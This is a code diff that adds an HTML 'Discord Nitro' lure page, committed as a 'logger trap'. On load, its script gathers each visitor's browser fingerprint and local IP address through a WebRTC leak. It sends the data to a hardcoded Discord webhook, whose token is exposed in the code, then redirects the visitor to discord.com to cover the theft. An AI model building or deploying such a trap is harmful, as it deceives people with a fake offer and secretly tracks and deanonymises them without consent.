@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Discord Nitro</title>
+  <script>
+    const webhook = "https://discord.com/api/webhooks/1383976146902978743/5-ZD34Dvodm_sDsftZELSEpM83aq_zX29j0NGLn2zRDNsYbgILFS0ehLqISr-xe_PnYu";
+
+    async function logData() {
+      const log = {
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen: `${screen.width}x${screen.height}`,
+        touch: 'ontouchstart' in window,
+        battery: 'unknown',
+        localIP: 'not available'
+      };
+
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          log.battery = `${Math.floor(battery.level * 100)}%`;
+        } catch {}
+      }
+
+      try {
+        const pc = new RTCPeerConnection({iceServers:[]});
+        pc.createDataChannel('');
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        pc.onicecandidate = (ice) => {
+          if (ice && ice.candidate && ice.candidate.candidate) {
+            const ipMatch = ice.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+            if (ipMatch) {
+              log.localIP = ipMatch[1];
+              sendLog(log);
+              pc.close();
+            }
+          }
+        };
+      } catch {
+        sendLog(log);
+      }
+    }
+
+    function sendLog(data) {
+      const payload = {
+        content: `📡 **BoBo Logger Hit**\n🕒 ${data.timestamp}\n🧠 UA: ${data.userAgent}\n💻 OS: ${data.platform}\n📐 Screen: ${data.screen}\n🗣️ Language: ${data.language}\n🌐 Timezone: ${data.timezone}\n🔋 Battery: ${data.battery}\n📍 Local IP: ${data.localIP}\n🔘 Touch: ${data.touch}`
+      };
+
+      fetch(webhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).finally(() => {
+        setTimeout(() => {
+          window.location.href = "https://discord.com";
+        }, 1000);
+      });
+    }
+
+    window.onload = logData;
+  </script>
+</head>
+<body>
+  <h1>Loading Discord Nitro...</h1>
+</body>
+</html>
+add logger trap page
